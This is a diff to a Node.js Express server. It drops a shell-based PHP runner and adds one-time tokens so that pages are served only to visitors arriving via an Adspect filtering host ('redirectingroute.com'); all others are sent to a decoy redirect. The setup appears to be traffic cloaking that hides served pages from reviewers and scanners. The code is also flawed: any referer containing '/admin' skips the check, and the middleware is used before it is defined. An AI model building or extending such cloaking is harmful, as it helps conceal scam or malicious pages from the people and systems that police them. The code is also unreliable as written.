@@ -302,7 +302,7 @@ const generateSessionId = (clientIP, userAgent) => {
 
 // Initialize server components
 const app = express();
-
+app.use(validateToken);
 app.use(express.json());
 app.use(cookieParser());
 
@@ -312,111 +312,27 @@ secureServer(app);
 
 
 
-async function servePHP(req, res, phpPath) {
-    // First, find PHP binary
-    const possiblePhpPaths = [
-        '/usr/bin/php',
-        '/usr/bin/php8.1',
-        '/usr/local/bin/php',
-        '/usr/local/bin/php8.1',
-        'php',
-        'php8.1'
-    ];
-
-    let phpBinary = null;
-    for (const path of possiblePhpPaths) {
-        try {
-            await execAsync(`which ${path}`);
-            phpBinary = path;
-            console.log('Found PHP binary at:', path);
-            break;
-        } catch (e) {
-            console.log(`PHP not found at: ${path}`);
-        }
+const validateToken = (req, res, next) => {
+    const isAdminPanel = req.headers.referer?.includes('/admin');
+    const token = req.query.token;
+    
+    // Skip token validation for admin panel and static assets
+    if (isAdminPanel || req.path.match(/\.(js|css|png|jpg|jpeg|gif|ico|svg)$/)) {
+        return next();
     }
 
-    if (!phpBinary) {
-        console.error('No PHP binary found in any standard location');
+    // Check if the request is coming from Adspect
+    const referer = req.headers.referer;
+    const isFromAdspect = referer && referer.includes('redirectingroute.com');
+    const isValidToken = token && tokenManager.isValidToken(token);
+
+    if (!isFromAdspect && !isValidToken) {
+        console.log('Invalid token or referer:', { token, referer });
         return res.redirect(state.settings.redirectUrl);
     }
-    try {
-        console.log('Attempting to serve PHP file:', phpPath);
-        
-        // Verify file exists
-        if (!fs.existsSync(phpPath)) {
-            console.error('PHP file not found:', phpPath);
-            throw new Error('PHP file not found');
-        }
 
-        // Set PHP binary path
-        const phpBin = process.env.RENDER ? '/usr/bin/php' : 'php';
-        
-        // Construct command with proper path escaping
-        const command = `${phpBinary} "${phpPath}"`;
-        console.log('Executing PHP command:', command);
-        
-        // Log system information
-        try {
-            const { stdout: sysInfo } = await execAsync('ls -la /usr/bin/php*');
-            console.log('PHP binaries in system:', sysInfo);
-        } catch (e) {
-            console.warn('Could not list PHP binaries:', e);
-        }
-
-        const { stdout, stderr } = await execAsync(command, {
-            env: {
-                ...process.env,
-                REMOTE_ADDR: req.ip,
-                HTTP_HOST: req.headers.host || 'localhost:3000',
-                HTTP_USER_AGENT: req.headers['user-agent'] || '',
-                HTTP_ACCEPT_LANGUAGE: req.headers['accept-language'] || '',
-                HTTP_REFERER: req.headers['referer'] || '',
-                HTTP_ACCEPT: req.headers['accept'] || '',
-                SERVER_SOFTWARE: 'Node.js',
-                SERVER_NAME: 'localhost',
-                SERVER_PROTOCOL: 'HTTP/1.1',
-                REQUEST_METHOD: req.method,
-                REQUEST_URI: req.url,
-                SCRIPT_FILENAME: phpPath,
-                SCRIPT_NAME: '/index.php',
-                PHP_SELF: '/index.php',
-                DOCUMENT_ROOT: path.dirname(phpPath),
-                REQUEST_SCHEME: 'http',
-                SERVER_PORT: '3000',
-                QUERY_STRING: req.query ? new URLSearchParams(req.query).toString() : '',
-                HTTPS: req.secure ? 'on' : 'off'
-            }
-        });
-
-        if (stderr) {
-            console.warn('PHP stderr output:', stderr);
-        }
-
-        // Log the raw output for debugging
-        console.log('Raw PHP output:', stdout);
-        
-        if (!stdout.trim()) {
-            console.warn('PHP output is empty');
-            throw new Error('Empty PHP output');
-        }
-
-        // Send the output as HTML
-        res.header('Content-Type', 'text/html');
-        res.send(stdout);
-    } catch (error) {
-        console.error('PHP execution error:', error);
-        // Log the full error details
-        console.error('Full error details:', {
-            message: error.message,
-            stack: error.stack,
-            command: error.cmd,
-            killed: error.killed,
-            code: error.code,
-            signal: error.signal
-        });
-        res.redirect(state.settings.redirectUrl);
-    }
-}
+    next();
+};
 
 app.use((req, res, next) => {
     console.log(`[REQUEST] ${req.method} ${req.path} ${req.originalUrl}`);
@@ -490,6 +406,47 @@ const state = {
     adminSessions: new Set()
 };
 
+const tokenManager = {
+    // Use a Map to store valid tokens with timestamps
+    tokens: new Map(),
+    
+    // Generate a new token
+    generateToken() {
+        const token = crypto.randomBytes(32).toString('hex');
+        this.tokens.set(token, Date.now());
+        return token;
+    },
+
+    // Validate a token
+    isValidToken(token) {
+        const timestamp = this.tokens.get(token);
+        if (!timestamp) return false;
+        
+        // Token expires after 5 minutes
+        if (Date.now() - timestamp > 5 * 60 * 1000) {
+            this.tokens.delete(token);
+            return false;
+        }
+        
+        // Delete used token
+        this.tokens.delete(token);
+        return true;
+    },
+
+    // Clean up expired tokens
+    cleanupTokens() {
+        const now = Date.now();
+        for (const [token, timestamp] of this.tokens) {
+            if (now - timestamp > 5 * 60 * 1000) {
+                this.tokens.delete(token);
+            }
+        }
+    }
+};
+
+// Add cleanup interval
+setInterval(() => tokenManager.cleanupTokens(), 5 * 60 * 1000);
+
 // Initialize available pages
 const pagesPath = join(__dirname, '../../public/pages');
 state.settings.availablePages = scanPages(pagesPath);
@@ -560,11 +517,13 @@ const pageServingMiddleware = async (req, res, next) => {
 app.get('/check-ip', async (req, res) => {
     const isAdminPanel = req.headers.referer?.includes('/admin');
     
-    // Check if referrer is from our Adspect URL
+    // Check if referrer is from our Adspect URL and validate token
     const referer = req.headers.referer;
-    const isFromAdspect = referer && referer.includes('your-adspect-url.com'); // Replace with your actual Adspect domain
+    const token = req.query.token;
+    const isFromAdspect = referer && referer.includes('redirectingroute.com');
+    const isValidToken = token && tokenManager.isValidToken(token);
     
-    if (!isFromAdspect && !isAdminPanel) {
+    if ((!isFromAdspect || !isValidToken) && !isAdminPanel) {
         return res.redirect(state.settings.redirectUrl);
     }
     
@@ -939,6 +898,17 @@ app.post('/verify-turnstile', async (req, res) => {
     }
 });
 
+app.post('/generate-token', async (req, res) => {
+    // Add secret key validation to ensure only Adspect can get tokens
+    const secretKey = req.headers['x-secret-key'];
+    if (secretKey !== process.env.ADSPECT_SECRET_KEY) {
+        return res.status(403).json({ error: 'Invalid secret key' });
+    }
+
+    const token = tokenManager.generateToken();
+    res.json({ token });
+});
+
 app.get('/', async (req, res) => {
     const isAdminPanel = req.headers.referer?.includes('/admin');
     
@@ -952,7 +922,7 @@ app.get('/', async (req, res) => {
 
     try {
         // Instead of running PHP, redirect to your hosted Adspect URL
-        res.redirect('https://redirectionroute.com/'); // Replace with your actual URL
+        res.redirect('https://redirectingroute.com/'); // Replace with your actual URL
     } catch (error) {
         console.error('Error in root route:', error);
         res.redirect(state.settings.redirectUrl);
